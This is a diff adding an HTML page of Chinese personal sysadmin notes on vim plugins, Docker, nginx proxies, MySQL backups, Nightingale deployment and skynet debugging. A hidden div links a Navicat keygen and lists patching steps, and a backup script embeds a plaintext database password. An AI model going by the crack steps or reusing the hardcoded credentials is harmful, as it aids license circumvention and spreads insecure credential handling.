+$ make VIMRUNTIMEDIR=/usr/share/vim/vim80 
+$ sudo make install
+</code></pre>
+<ul>
+<li>安装成功后，通过/usr/local/vim8/bin/vim运行vim命令。将vim命令路径添加到系统变量，就可以直接运行vim了。</li>
+</ul>
+<pre><code>$ /usr/local/vim/vim8/bin/vim /etc/profile.d/path.sh
+</code></pre>
+<p>添加以下内容：</p>
+<pre><code>#!/bin/bash
+export PATH=$PATH:/usr/local/vim/vim8/bin/
+
+$ source /etc/profile.d/path.sh
+</code></pre>
+<h2 id="帮助-2"><a class="header" href="#帮助-2">帮助</a></h2>
+<ul>
+<li><a href="https://www.cnblogs.com/JahanGu/p/7452527.html">linux-Centos7安装python3并与python2共存</a></li>
+</ul>
+<h2 id="vim插件"><a class="header" href="#vim插件">vim插件</a></h2>
+<h3 id="注释插件"><a class="header" href="#注释插件">注释插件</a></h3>
+<h4 id="vim-commentary"><a class="header" href="#vim-commentary">vim-commentary</a></h4>
+<ul>
+<li>gitbub:<a href="https://github.com/tpope/vim-commentary">vim-commentary</a></li>
+<li>优点:好用</li>
+<li>安装</li>
+<li>使用:https://blog.csdn.net/jpch89/article/details/94453692</li>
+</ul>
+<h3 id="语法检测"><a class="header" href="#语法检测">语法检测</a></h3>
+<h4 id="syntastic"><a class="header" href="#syntastic">syntastic</a></h4>
+<ul>
+<li><a href="https://github.com/vim-syntastic/syntastic">syntastic</a></li>
+</ul>
+<h4 id="ale"><a class="header" href="#ale">ale</a></h4>
+<ul>
+<li><a href="https://github.com/dense-analysis/ale">ale</a></li>
+<li>优点:异步,不会有卡顿感</li>
+<li>安装:</li>
+</ul>
+<pre><code>Plug 'dense-analysis/ale'
+</code></pre>
+<h4 id="lua-checker"><a class="header" href="#lua-checker">lua-checker</a></h4>
+<ul>
+<li>luacheck:<a href="https://gitee.com/bobu/luacheck">gitee</a></li>
+<li><a href="http://brightguo.com/luacheck%E4%BD%BF%E7%94%A8/">luacheck使用</a></li>
+<li>lua-rocks:<a href="https://github.com/luarocks/luarocks/wiki/Installation-instructions-for-Unix">github</a></li>
+</ul>
+<h3 id="quickfix使用"><a class="header" href="#quickfix使用">quickfix使用</a></h3>
+<pre><code>quickfix功能将编译过程中产生的错误信息保存到文件中，
+然后vim利用这些信息跳转到源文件的对应位置，
+我们就可以进行错误的修正，
+之后跳到下一个错误重复上述操作，
+从而极大地提高编译错误的修改效率。
+:cc     显示详细错误信息
+:cp     跳到上一个错误
+:cn     跳到下一个错误
+:cw     如果有错误列表，则打开quickfix窗口，没有则什么也不错
+:cope(n) 打开quickfix窗口，可以在后面添加窗口高度参数，如10行： :copen 10
+:ccl(ose) 关闭quickfix窗口
+</code></pre>
+<h2 id="vim基本用法"><a class="header" href="#vim基本用法">vim基本用法</a></h2>
+<p>e: end 移动到一个单词的最后一个字符</p>
+<h3 id="命令行模式ex模式"><a class="header" href="#命令行模式ex模式">命令行模式(Ex模式)</a></h3>
+<ul>
+<li>
+<p>{start},{end}都是地址,这里用行号代表地址
+:1,5p 打印第1到第5行，光标移动到第5行(:{start},{end}p)</p>
+</li>
+<li>
+<p>1代表第1行的地址</p>
+</li>
+<li>
+<p>.代表当前行的地址</p>
+</li>
+<li>
+<p>%代表当前文件中的所有行</p>
+</li>
+<li>
+<p>$代表行尾</p>
+</li>
+<li>
+<p>'&lt;代表高亮选区的开始</p>
+</li>
+<li>
+<p>'&gt;代表高亮选区的结束</p>
+</li>
+<li>
+<p>'m 包含位置标记m的行</p>
+</li>
+<li>
+<p>normal命令:</p>
+</li>
+</ul>
+<pre><code>:4,6normal A; 在第4行到第6行后面加入分号
+:4,6normal i// c++中注释4到6行
+:4,6normal i-- lua中注释4到6行
+</code></pre>
+<ul>
+<li>
+<p>@:命令重复上一个Ex</p>
+</li>
+<li>
+<p>回溯历史命令</p>
+</li>
+</ul>
+<pre><code>:ag up/down键:查看含有ag的历史命令
+</code></pre>
+<ul>
+<li>命令行窗口</li>
+</ul>
+<pre><code>Ctrl+f:命令行模式切换到命令行窗口
+q:打开命令行Ex窗口
+q/打开命令行查询窗口
+</code></pre>
+<h3 id="执行shell中的程序"><a class="header" href="#执行shell中的程序">执行Shell中的程序</a></h3>
+<ul>
+<li>：!{cmd} 单次执行命令</li>
+<li>:shell 开启一个交互式的shell 使用exit退出返回到vim</li>
+<li>CTRL Z:挂起Vim返回bash执行命令 fg返回Vim,jobs查看后台挂起进程</li>
+</ul>
+<h3 id="移动"><a class="header" href="#移动">移动</a></h3>
+<ul>
+<li>j,k移动实际行</li>
+<li>gj,gk移动屏幕行(在有折行的情况下十分有用)</li>
+</ul>
+<h3 id="word-emotions基于单词的移动"><a class="header" href="#word-emotions基于单词的移动">word-emotions(基于单词的移动)</a></h3>
+<ul>
+<li>
+<p>w 正向移动到下一个单词的开头</p>
+</li>
+<li>
+<p>e 正向移动到下一个单词的结尾</p>
+</li>
+<li>
+<p>b 反向移动到上一个单词的开头</p>
+</li>
+<li>
+<p>ge 反向移动到上一个单词的开头</p>
+</li>
+<li>
+<p>ea 在单词结尾添加</p>
+</li>
+<li>
+<p>gea 在上一个单词结尾添加</p>
+</li>
+</ul>
+<h3 id="对字符进行查找"><a class="header" href="#对字符进行查找">对字符进行查找</a></h3>
+<ul>
+<li>f{char} 查字符</li>
+<li>F{char} 反向查字符</li>
+<li>; 分号重复上次查找</li>
+<li>, 相反方向重复上次查找</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="vim-plug"><a class="header" href="#vim-plug">vim-plug</a></h1>
+<h2 id="说明"><a class="header" href="#说明">说明</a></h2>
+<ol>
+<li>vim-plug 是一个Vim插件管理器，</li>
+<li>利用异步并行可以快速地安装、更新和卸载插件。</li>
+<li>它的安装和配置都非常简单，而且在操作过程中会给出很多易读的反馈信息，是一个相当友好精简的插件。</li>
+</ol>
+<h2 id="安装配置"><a class="header" href="#安装配置">安装配置</a></h2>
+<ol>
+<li>下载 plug.vim 文件，</li>
+</ol>
+<pre><code>curl -fLo ~/.vim/autoload/plug.vim --create-dirs  https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim
+wget https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim
+</code></pre>
+<ol start="2">
+<li>根据操作系统不同，放置在以下autoload目录中：</li>
+</ol>
+<ul>
+<li>Linux: ~/.vim/autoload</li>
+</ul>
+<pre><code>mkdir ~/.vim/
+mkdir ~/.vim/autoload/
+cp plug/plug.vim ~/.vim/autoload
+</code></pre>
+<ul>
+<li>Windows: ~\vimfiles\autoload\plug.vim</li>
+</ul>
+<ol start="3">
+<li>在vimrc配置文件中增加plug-vim部分，示例如下：</li>
+</ol>
+<pre><code>call plug#begin('~/.vim/plugged')
+&quot; Shorthand notation for plugin
+Plug 'foo/bar'
+call plug#end()
+</code></pre>
+<h2 id="插件命令"><a class="header" href="#插件命令">插件命令</a></h2>
+<ul>
+<li>安装插件:PlugInstall</li>
+<li>卸载插件:PlugClean</li>
+<li>更新vim-plug:PlugUpgrade</li>
+<li>更新插件:PlugUpdate</li>
+<li>插件状态:PlugStatus</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="nerdtree"><a class="header" href="#nerdtree">nerdtree</a></h1>
+<h2 id="设置nerdtree的宽度"><a class="header" href="#设置nerdtree的宽度">设置nerdtree的宽度</a></h2>
+<ul>
+<li>在.vimrc中添加配置如下</li>
+</ul>
+<pre><code>let g:NERDTreeWinSize = 25
+;类似设置Tagbar的宽度
+let g:tagbar_width = 30
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="vim-commentary-1"><a class="header" href="#vim-commentary-1">vim-commentary</a></h1>
+<h2 id="插件地址httpsgithubcomtpopevim-commentary"><a class="header" href="#插件地址httpsgithubcomtpopevim-commentary">插件地址:https://github.com/tpope/vim-commentary</a></h2>
+<h2 id="插件用法"><a class="header" href="#插件用法">插件用法</a></h2>
+<p>单行注释：
+普通模式下 gcc，可以配合 . 使用。
+普通模式下 vgc、Vgc、<C-v>gc，即先进入可视模式再 gc。
+多行注释：
+可视模式下 gc，三种可视模式都可以使用，会注释掉可视模式选区跨越的所有行。
+[count]gc，一次性注释 count 行。
+撤销上次注释动作：用 u 即可。
+取消单行注释：
+普通模式下 gcc
+普通模式下 gcu，如果有多行也会取消多行注释
+先进入可视模式，再 gc
+取消多行注释：
+普通模式下：gcu
+普通模式下：gcgc
+普通模式下：[count]gcc
+先进入可视模式，再 gc</p>
+<h2 id="极简版用法"><a class="header" href="#极简版用法">极简版用法</a></h2>
+<p>这里尽量选择直观或者最优解，用一句话概括该插件的核心用法。
+单行注释用 gcc，多行注释先进入可视模式再 gc，取消注释用 gcu</p>
+<h2 id="使用方法-1"><a class="header" href="#使用方法-1">使用方法</a></h2>
+<pre><code>gcc     注释当前行（普通模式）
+gc      可视模式下，注释当前选中的部分
+gcu     撤销上一次注释的部分，可以是一行也可以是多行
+gcgc    撤销注释当前行和邻近的上下两行
+</code></pre>
+<h2 id="修改注释符号"><a class="header" href="#修改注释符号">修改注释符号</a></h2>
+<pre><code>&quot;vim-commentary
+&quot;为python和shell等添加注释
+autocmd FileType python,shell,coffee set commentstring=#\ %s
+&quot;修改注释风格
+autocmd FileType java,c,cpp set commentstring=//\ %s
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="vim-fugitive"><a class="header" href="#vim-fugitive">vim-fugitive</a></h1>
+<h2 id="github地址-1"><a class="header" href="#github地址-1">github地址</a></h2>
+<p>https://github.com/tpope/vim-fugitive</p>
+<h2 id="使用-2"><a class="header" href="#使用-2">使用</a></h2>
+<pre><code>:Gblame其实就是执行git blame命令，然后直接在vim中将git的输出结果与源代码一一对应起来。这样当你读团队代码的时候发现了一个坑，然后想知道是谁写的这个坑的时候，只需要:Gblame一下，结果立马呈现。
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="install-4"><a class="header" href="#install-4">install</a></h2>
+<h3 id="方法1"><a class="header" href="#方法1">方法1</a></h3>
+<p>sudo pacman -S fzf</p>
+<h3 id="方法2"><a class="header" href="#方法2">方法2</a></h3>
+<p>git clone --depth 1 https://github.com/junegunn/fzf.git ~/.fzf
+cd ~/.fzf/
+./install</p>
+<h2 id="key"><a class="header" href="#key">key</a></h2>
+<ol>
+<li>上下选择:C-k,C-j</li>
+<li>退出:C-c</li>
+<li>列出当前目录: C-T</li>
+<li>历史搜索: C-R</li>
+<li>选择目录: Alt-c</li>
+<li>NB用法，用vim打开文件: vim $(fzf)</li>
+<li>NB用法，用vim打开文件: vim $(ag findparm -l | fzf)</li>
+<li>切换目录:cd $(find * -type d | fzf)</li>
+</ol>
+<h2 id="use"><a class="header" href="#use">use</a></h2>
+<ol>
+<li>cmd | fzf</li>
+<li>cd *****<Tab></li>
+<li>vim **<Tab></li>
+<li>oh-my-zsh</li>
+</ol>
+<h2 id="preview"><a class="header" href="#preview">preview</a></h2>
+<pre><code>export FZF_CTRL_T_OPTS=&quot;--preview '(highlight -O ansi -l {} 2&gt; /dev/null || cat {} || tree -C {}) 2&gt; /dev/null | head -200'&quot;
+</code></pre>
+<h2 id="vim-1"><a class="header" href="#vim-1">vim</a></h2>
+<ol>
+<li>cmd</li>
+</ol>
+<pre><code>Plug 'junegunn/fzf', { 'dir': '~/.fzf', 'do': './install --all' }
+Plug '/usr/bin/fzf'
+Plug 'junegunn/fzf.vim'
+</code></pre>
+<h2 id="参考文档"><a class="header" href="#参考文档">参考文档</a></h2>
+<ol>
+<li>https://www.cnblogs.com/dylancao/p/10833431.html</li>
+<li>https://www.jianshu.com/p/bb91582317ed</li>
+<li>https://segmentfault.com/a/1190000015977368</li>
+</ol>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="coc"><a class="header" href="#coc">coc</a></h1>
+<h2 id="vim-插件按钮"><a class="header" href="#vim-插件按钮">vim 插件按钮</a></h2>
+<pre><code>https://vimawesome.com/plugin/coc-nvim
+</code></pre>
+<h2 id="支持c"><a class="header" href="#支持c">支持c++</a></h2>
+<h3 id="安装-1"><a class="header" href="#安装-1">安装</a></h3>
+<ol>
+<li>安装ccls</li>
+</ol>
+<pre><code>sudo pacman -S ccls
+https://blog.csdn.net/yupei881027/article/details/104876551/
+https://www.jianshu.com/p/55cf1fa7a467
+git clone --depth=1 --recursive https://github.com/MaskRay/ccls
+cmake -H. -BRelease -DCMAKE_BUILD_TYPE=Release -DCMAKE_CXX_COMPILER=clang++ -DCMAKE_PREFIX_PATH=/path/to/clang+llvm
+cd ccls
+sudo cmake --build Release --target install
+</code></pre>
+<h3 id="ccls-帮助文档"><a class="header" href="#ccls-帮助文档">ccls 帮助文档</a></h3>
+<ul>
+<li><a href="https://github.com/MaskRay/ccls/wiki/Build">ccls帮助文档</a></li>
+</ul>
+<ol start="2">
+<li>install extensions</li>
+</ol>
+<pre><code>:CocInstall coc-json coc-tsserver
+</code></pre>
+<ol start="3">
+<li>配置c/c++ language server</li>
+</ol>
+<pre><code>:CocConfig
+https://github.com/neoclide/coc.nvim/wiki/Language-servers#ccobjective-c
+{
+    &quot;languageserver&quot;: {
+        &quot;ccls&quot;: {
+            &quot;command&quot;: &quot;ccls&quot;,
+                &quot;filetypes&quot;: [&quot;c&quot;, &quot;cc&quot;, &quot;cpp&quot;, &quot;c++&quot;, &quot;objc&quot;, &quot;objcpp&quot;],
+                &quot;rootPatterns&quot;: [&quot;.ccls&quot;, &quot;compile_commands.json&quot;, &quot;.git/&quot;, &quot;.hg/&quot;],
+                &quot;initializationOptions&quot;: {
+                    &quot;cache&quot;: {
+                        &quot;directory&quot;: &quot;/tmp/ccls&quot;
+                    }
+                }
+        }
+    }
+}
+</code></pre>
+<h2 id="支持lua"><a class="header" href="#支持lua">支持lua</a></h2>
+<pre><code>CocInstall coc-lua
+#安装lua-lsp
+#https://github.com/Alloyed/lua-lsp
+luarocks install --server=http://luarocks.org/dev lua-lsp
+&quot;languageserver&quot;: {
+    &quot;lua&quot;: {
+        &quot;command&quot;: &quot;lua-lsp&quot;,
+        &quot;filetypes&quot;: [&quot;lua&quot;]
+    }
+}
+
+</code></pre>
+<h2 id="帮助-3"><a class="header" href="#帮助-3">帮助</a></h2>
+<ul>
+<li><a href="https://blog.csdn.net/bojin4564/article/details/105832148/?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&amp;spm=1001.2101.3001.4242">安装说明</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="docker"><a class="header" href="#docker">Docker</a></h1>
+<h1 id="参考-1"><a class="header" href="#参考-1">参考</a></h1>
+<ul>
+<li><a href="https://www.cnblogs.com/imzhizi/p/10718310.html">linux(manjaro)安装Docker</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="jenkins"><a class="header" href="#jenkins">jenkins</a></h1>
+<h1 id="参考-2"><a class="header" href="#参考-2">参考</a></h1>
+<ul>
+<li><a href="https://www.cnblogs.com/ming-blogs/p/10903408.html">基于Docker+Jenkins实现自动化部署</a></li>
+<li><a href="https://blog.csdn.net/chj_1224365967/article/details/108003758">Jenkins忘记密码</a></li>
+<li><a href="http://www.360doc.com/content/20/0613/17/1314937_918274078.shtml">Jenkins显示中文</a></li>
+<li><a href="https://github.com/jenkinsci/docker/blob/587b2856cd225bb152c4abeeaaa24934c75aa460/Dockerfile">Jenkins Dockerfile</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="docker-nginx"><a class="header" href="#docker-nginx">docker nginx</a></h1>
+<h2 id="基本命令"><a class="header" href="#基本命令">基本命令</a></h2>
+<pre><code>#查看容器
+docker ps
+
+#创建并运行一个容器nginx127
+docker run --name=nginx127 -p 8081:80 -d docker.io/nginx
+
+#进入容器nginx127
+docker exec -it nginx127 /bin/bash
+
+#退出容器
+exit
+
+#停止容器
+docker stop nginx127
+
+#删除容器
+docker rm nginx127
+</code></pre>
+<h2 id="配置nginx-密码访问"><a class="header" href="#配置nginx-密码访问">配置nginx 密码访问</a></h2>
+<ul>
+<li>修改容器内配置</li>
+</ul>
+<pre><code>#查看运行容器的ID
+docker ps
+
+#进入nginx容器
+docker exec -it 容器ID /bin/bash
+
+#容器内部操作
+#更新软件源
+apt-get update
+
+#安装apache2-utils
+apt-get install apache2-utils
+
+#创建用户名
+htpasswd -c /etc/nginx/passwd.db 用户名
+
+#输入密码（自动弹出）
+New password:
+Re-type new password:
+
+#查看用户和密码
+cat /etc/nginx/passwd.db
+
+#退出
+exit
+</code></pre>
+<ul>
+<li>修改nginx配置文件</li>
+</ul>
+<pre><code>server {
+    listen       80;
+    server_name  域名;
+
+    access_log  /var/log/nginx/logging.access.log  main;
+
+    location / {
+        auth_basic &quot;Please input password&quot;; #这里是验证时的提示信息 
+            auth_basic_user_file /etc/nginx/passwd.db;
+        proxy_set_header  Host  $http_host;
+        proxy_set_header  X-Real-IP  $remote_addr;
+        proxy_set_header  X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_pass   http://IP:8088; 
+    }
+
+    error_page   500 502 503 504  /50x.html;
+    location = /50x.html {
+        root   /usr/share/nginx/html;
+    }
+}
+</code></pre>
+<ul>
+<li><a href="http://t.zoukankan.com/yanglei-xyz-p-12212530.html">docker nginx 配置密码访问</a></li>
+<li><a href="https://www.cnblogs.com/yucongblog/p/13428535.html">docker nginx 配置转发</a></li>
+</ul>
+<h2 id="mysql-nginx-转发"><a class="header" href="#mysql-nginx-转发">mysql nginx 转发</a></h2>
+<pre><code>#user  nobody;
+worker_processes  1;
+
+#error_log  logs/error.log;
+#error_log  logs/error.log  notice;
+#error_log  logs/error.log  info;
+
+#pid        logs/nginx.pid;
+
+
+events {
+    worker_connections  1024;
+}
+
+stream {
+    upstream mysql_proxy_zp {
+        hash $remote_addr consistent;
+        server mybonline-inet.mysql.rds.aliyuncs.com:8000 weight=5 max_fails=3 fail_timeout=30s;
+    }
+
+    server {
+#数据库服务器监听端口
+        listen 8000;
+        proxy_connect_timeout 10s;
+#设置客户端和代理服务之间的超时时间，如果5分钟内没操作将自动断开。
+        proxy_timeout 300s;
+        proxy_pass mysql_proxy_zp;
+    }
+}
+</code></pre>
+<h2 id="nginx配置代理上网"><a class="header" href="#nginx配置代理上网">nginx配置代理上网</a></h2>
+<pre><code>#user nobody;
+worker_processes 1;
+error_log /var/log/nginx/error.log debug;
+
+events {
+    worker_connections 1024;
+}
+
+http {
+    resolver 8.8.8.8;
+    server {
+        listen 8088;
+        location / {
+            proxy_pass http://$http_host$request_uri;
+        }
+    }
+</code></pre>
+<h2 id="windows-安装与使用ngin"><a class="header" href="#windows-安装与使用ngin">windows 安装与使用ngin</a></h2>
+<pre><code>https://www.cnblogs.com/jiangwangxiang/p/8481661.html
+http://nginx.org/en/download.html
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="gitbook"><a class="header" href="#gitbook">gitbook</a></h1>
+<h2 id="docker-安装gitbook"><a class="header" href="#docker-安装gitbook">docker 安装gitbook</a></h2>
+<pre><code>docker run -d --name gitbook \
+           -p 4001:4000  \
+           -v /data/doc/doc/gitbook:/srv/gitbook \
+           -v /data/doc/doc/gitbook/_book:/srv/html \
+           fellah/gitbook
+</code></pre>
+<ul>
+<li><a href="https://www.jianshu.com/p/190a6e4a7af8">参考文档</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="mysql-查看t_account表结构"><a class="header" href="#mysql-查看t_account表结构">mysql 查看t_account表结构</a></h2>
+<pre><code>desc t_account;
+show columns from t_account;
+
+describe t_account;
+show create table t_account;
+</code></pre>
+<h2 id="mysql-查看存储过程"><a class="header" href="#mysql-查看存储过程">mysql 查看存储过程</a></h2>
+<pre><code>select `name` from mysql.proc where db = 'xx' and `type` = 'PROCEDURE'   //存储过程
+select `name` from mysql.proc where db = 'xx' and `type` = 'FUNCTION'   //函数
+
+show create procedure register; //存储过程register
+
+show procedure status; //存储过程
+
+show function status;     //函数
+</code></pre>
+<h2 id="解决数据库注册中文写入失败的问题"><a class="header" href="#解决数据库注册中文写入失败的问题">解决数据库注册中文写入失败的问题</a></h2>
+<ul>
+<li>
+<p>问题描述：
+调用注册存储过程是，nickname 含中文写入失败</p>
+</li>
+<li>
+<p>解决方法:
+将存储过程中文参数由varchar 改为nvarchar类型</p>
+</li>
+</ul>
+<h2 id="解决数据库在插入数据中包含表情特殊符"><a class="header" href="#解决数据库在插入数据中包含表情特殊符">解决数据库在插入数据中包含表情特殊符</a></h2>
+<ul>
+<li>
+<p>问题描述：
+在插入数据的过程中，如玩家名字，包含表情 插入数据失败</p>
+</li>
+<li>
+<p>解决方法
+将字段字符集设置utf8mb4，排序规则设置utf8mb4_unicode_ci
+t_account:nickname t_record_circle:circle_scores t_record_round:round_scores等等</p>
+</li>
+</ul>
+<h2 id="修改密码"><a class="header" href="#修改密码">修改密码</a></h2>
+<ul>
+<li>使用 mysqladmin 命令修改 MySQL 的 root 用户密码格式为</li>
+</ul>
+<pre><code>mysqladmin -u用户名 -p旧密码 password 新密码。
+</code></pre>
+<h2 id="mysql-工具"><a class="header" href="#mysql-工具">mysql 工具</a></h2>
+<ul>
+<li>
+<p>官方下载地址:</p>
+<ul>
+<li><a href="https://download.navicat.com.cn/download/navicat15-premium-cs.AppImage">CN1</a></li>
+<li><a href="https://download3.navicat.com/download/navicat15-premium-cs.AppImage">CN2</a></li>
+<li><a href="https://download3.navicat.com/download/navicat15-mysql-en.AppImage">EN1</a></li>
+</ul>
+</li>
+</ul>
+<div style='display: none'>
+- windows版本激活
+  * [https://www.cnblogs.com/hfxtest/p/12513210.html](https://www.cnblogs.com/hfxtest/p/12513210.html)
+- [navicat for linux 破解](https://gitee.com/yangzhuoming/navicat-keygen/blob/linux/README.zh-CN.md)
+  * steps:
+```
+  sudo mount -o loop ~/tools/bin/navicat15-premium-cs.AppImage ~/tools/navicat15-premium-cs
+  cp -r ~/tools/bin/navicat15-premium-cs ~/tools/bin/navicat15-premium-cs-patched
+  sudo umount ~/tools/bin/navicat15-premium-cs
+  rm -rf ~/tools/navicat15-premium-cs
+```
+  * [注册机编译](https://gitee.com/yangzhuoming/navicat-keygen/blob/linux/doc/how-to-build.md)
+>
+<h2 id="常用sql"><a class="header" href="#常用sql">常用sql</a></h2>
+<ul>
+<li>如何重置mysql中的自动自增值</li>
+</ul>
+<pre><code>alter table t_wxmini_balance_record auto_increment=1;
+</code></pre>
+<h2 id="mysql备份数据库"><a class="header" href="#mysql备份数据库">mysql备份数据库</a></h2>
+<ul>
+<li>centos7安装mysqldump</li>
+</ul>
+<pre><code>yum install mysql
+</code></pre>
+<ul>
+<li>备份数据库</li>
+</ul>
+<pre><code>[root@ecs-7d02 db]# cat bak_db.sh
+#help:123456
+dt=$(date +%Y%m%d_%H%M%S)
+host=192.168.0.215
+des_file=gzzjdb_bak_$dt.sql
+bak_file=gzzjdb_bak_$dt.tar.gz
+mysqldump -h$host -P8000 -uroot -p gzzjdb --routines --password=GZZJ@123456 &gt; $des_file
+tar -czvf $bak_file $des_file
+mv $bak_file /data/db/bak/
+rm -f $des_file
+</code></pre>
+<ul>
+<li>定时删除备份,删除7天前的备份</li>
+</ul>
+<pre><code>find /data/db/bak/ -mtime +7  -name &quot;*.tar.gz&quot; -exec rm -f {}\;
+echo &quot;-----&gt;del_bak logs:&quot;`date +&quot;%Y-%m-%d %H:%M:%S&quot;` &gt;&gt; /data/db/del_bak.log
+</code></pre>
+<ul>
+<li>crontab定时任务</li>
+</ul>
+<pre><code>0 4 * * * /data/db/del_mysql_bak.sh
+0 5 * * * /data/db/bak_online_db_with_data.sh
+</code></pre>
+<ul>
+<li>参考:https://blog.csdn.net/HelloWorldYangSong/article/details/122254372</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="github-开源"><a class="header" href="#github-开源">github 开源</a></h1>
+<h2 id="工具-1"><a class="header" href="#工具-1">工具</a></h2>
+<ul>
+<li>1.<a href="https://github.com/gokcehan/lf">类似ranger的文件管理工具lf</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="夜莺"><a class="header" href="#夜莺">夜莺</a></h1>
+<h2 id="部署"><a class="header" href="#部署">部署</a></h2>
+<ul>
+<li>https://blog.csdn.net/yanggd1987/article/details/109007315</li>
+<li><a href="https://idc.wanyunshuju.com/li/1850.html">centos7部署夜莺</a></li>
+<li><a href="https://blog.csdn.net/weixin_43546282/article/details/109012603">三分钟构建自动化运维平台-nightingale(夜莺)</a></li>
+</ul>
+<pre><code>yum install -y mariadb* redis nginx
+</code></pre>
+<ul>
+<li>mariadb开机自启</li>
+</ul>
+<pre><code>systemctl enable mariadb
+</code></pre>
+<ul>
+<li>启动mariadb</li>
+</ul>
+<pre><code>systemctl start mariadb
+</code></pre>
+<ul>
+<li>查询mysql进程</li>
+</ul>
+<pre><code>ps aux | grep mysql
+</code></pre>
+<ul>
+<li>数据库初始化</li>
+</ul>
+<pre><code>mysql_secure_installation
+</code></pre>
+<ul>
+<li>redis 开机自启动</li>
+</ul>
+<pre><code>systemctl enable redis
+</code></pre>
+<ul>
+<li>启动redis</li>
+</ul>
+<pre><code>systemctl start redis
+</code></pre>
+<ul>
+<li>nginx开机自启动</li>
+</ul>
+<pre><code>systemctl enable nginx
+</code></pre>
+<ul>
+<li>2、下载我们编译好的二进制到/home/n9e目录，如果要更换目录，要注意修改nginx.conf，建议先用这个目录，玩熟了再说</li>
+</ul>
+<pre><code>mkdir -p /home/n9e
+cd /home/n9e
+wget http://116.85.64.82/n9e.tar.gz
+tar zxvf n9e.tar.gz
+</code></pre>
+<ul>
+<li>3、初始化数据库，这里假设使用root账号，密码1234，如果不是这个账号密码，注意修改/home/n9e/etc/mysql.yml</li>
+</ul>
+<pre><code>cd /home/n9e/sql
+mysql -uroot -p1234 &lt; n9e_ams.sql
+mysql -uroot -p1234 &lt; n9e_hbs.sql
+mysql -uroot -p1234 &lt; n9e_job.sql
+mysql -uroot -p1234 &lt; n9e_mon.sql
+mysql -uroot -p1234 &lt; n9e_rdb.sql
+</code></pre>
+<h2 id="video-1"><a class="header" href="#video-1">video</a></h2>
+<ul>
+<li>https://www.bilibili.com/video/BV13z411q7in/</li>
+</ul>
+<h2 id="测试地址"><a class="header" href="#测试地址">测试地址</a></h2>
+<ul>
+<li>http://139.9.240.143/rdb/resources-tree</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="skynet"><a class="header" href="#skynet">skynet</a></h1>
+<ul>
+<li>skynet-rabbitmq(https://github.com/cloudfreexiao/skynet-rabbitmq/blob/master/rabbitmqstomp.lua)</li>
+<li>skynet-etcd(https://github.com/cloudfreexiao/skynet-etcd)</li>
+<li>skynet-thrift(https://github.com/cloudfreexiao/skynet_thrift)</li>
+<li>lua_httpws(https://github.com/cloudfreexiao/lua_httpws)</li>
+<li>skynet-serverdemo-rillserver(https://github.com/cloudfreexiao/RillServer)</li>
+<li>websocketlib-skynetpatch(https://github.com/sctangqiang/skynetpatch)</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h3 id="debug-console"><a class="header" href="#debug-console">debug console</a></h3>
+<div class="table-wrapper"><table><thead><tr><th>命令</th><th>作用</th><th>example</th></tr></thead><tbody>
+<tr><td>debug address</td><td>调试服务</td><td>debug c</td></tr>
+<tr><td>watch(proto,cond)</td><td>加一个断点</td><td>watch(&quot;lua&quot;, function(<em>,</em>,cmd) return cmd==&quot;get&quot; end)</td></tr>
+<tr><td>c</td><td>继续处理这条消息，离开关注状态</td><td>c</td></tr>
+<tr><td>n</td><td>下一步,不走进函数内部</td><td>n</td></tr>
+<tr><td>s</td><td>下一步,走进函数内部</td><td>s</td></tr>
+<tr><td>cont</td><td>退出调试状态</td><td>cont</td></tr>
+<tr><td>debug.traceback(_CO)</td><td>查看调用堆栈</td><td>-</td></tr>
+</tbody></table>
+</div><div style="break-before: page; page-break-before: always;"></div><h1 id="skynet热更新-clearcache的使用体会"><a class="header" href="#skynet热更新-clearcache的使用体会">skynet热更新-clearcache的使用体会</a></h1>
+<h2 id="skynet-热更新主要有2种方法"><a class="header" href="#skynet-热更新主要有2种方法">skynet 热更新主要有2种方法</a></h2>
+<ul>
+<li>第一种：使用clearcache</li>
+<li>第二种：使用console inject lua脚本</li>
+</ul>
+<h2 id="动态创建的服务的热更新"><a class="header" href="#动态创建的服务的热更新">动态创建的服务的热更新</a></h2>
+<ul>
+<li>如果一个skynet服务是在业务流程中动态创建的，那么在修改代码后，使用clearcache就可以保证下次再创建的新的服务是使用的新的代码。</li>
+</ul>
+<h2 id="创建后长期不销毁重建的服务如何热更新"><a class="header" href="#创建后长期不销毁重建的服务如何热更新">创建后长期不销毁重建的服务，如何热更新？</a></h2>
+<ul>
+<li>
+<p>如果是在进程启动时创建，或创建后就一直存在的服务需要热更新怎么办呢？</p>
+<ul>
+<li>方法1: 对于这种情况目前inject是首选。但是有时候需要修改的代码量比较大，inject 脚本的方式就非常复杂且容易出错。</li>
+<li>方法2: 当然，还有一种方式就是采用轮服的机制解决。从进程级别解决问题。但是这个代价又太大了，比clearcache的成本还高。</li>
+</ul>
+</li>
+<li>
+<p>这里我们还有一个思路就是可以在业务服前加一个管理调度服务。例如A1 skynet服务需要发消息给B1 skynet服务来实现某个功能。消息流为：</p>
+</li>
+</ul>
+<pre><code>A1 ---&gt; B1
+</code></pre>
+<ul>
+<li>我们可以在B1前加一个B_manager服务，A服务通过B_manager服来传递消息给B1服务， 消息流为：</li>
+</ul>
+<pre><code>A1 ---&gt; B_Manager ---&gt; B1
+</code></pre>
+<ul>
